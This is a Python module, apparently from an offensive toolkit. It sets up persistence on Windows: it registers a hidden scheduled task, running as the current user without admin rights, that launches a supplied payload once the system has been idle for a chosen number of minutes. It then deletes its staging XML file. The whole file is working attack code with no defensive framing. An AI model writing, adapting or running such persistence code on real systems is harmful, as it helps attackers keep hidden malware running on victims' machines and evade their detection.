"""
Idle-triggered scheduled task persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    run_command,
    validate_payload_path,
    get_current_username,
    clean_temp_file
)
from templates.xml_templates import TaskXMLTemplates
from config import DEFAULT_STAGING_DIR, DEFAULT_IDLE_MINUTES


class IdleTrigger:
    """Handles idle-triggered scheduled tasks"""
    
    def __init__(self):
        self.xml_templates = TaskXMLTemplates()
    
    def create(self, task_name, payload_path, idle_minutes=DEFAULT_IDLE_MINUTES):
        """
        Create task that triggers when system is idle
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            idle_minutes (int): Minutes of idle time required
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating idle-triggered scheduled task...")
        print(f"[*] Idle time: {idle_minutes} minutes")
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        if idle_minutes < 1 or idle_minutes > 999:
            print(f"[-] Invalid idle time: Must be between 1-999 minutes")
            return None
        
        user = get_current_username()
        task_xml = self.xml_templates.idle_trigger(user, payload_path, idle_minutes)
        
        xml_file = os.path.join(DEFAULT_STAGING_DIR, f"{task_name}.xml")
        
        try:
            with open(xml_file, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            command = f'schtasks /Create /TN "{task_name}" /XML "{xml_file}" /F'
            result = run_command(command)
            
            clean_temp_file(xml_file)
            
            if result['success']:
                print(f"[+] Scheduled task created successfully!")
                print(f"    Task Name: {task_name}")
                print(f"    Trigger: System idle ({idle_minutes} minutes)")
                print(f"    Payload: {payload_path}")
                print(f"    Hidden: Yes")
                
                return {
                    'method': 'idle_trigger',
                    'task_name': task_name,
                    'trigger': f'idle_{idle_minutes}_minutes',
                    'idle_time': idle_minutes,
                    'payload': payload_path,
                    'requires_admin': False,
                    'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
                }
            else:
                print(f"[-] Failed to create task")
                return None
        
        except Exception as e:
            print(f"[-] Error: {e}")
            clean_temp_file(xml_file)
            return None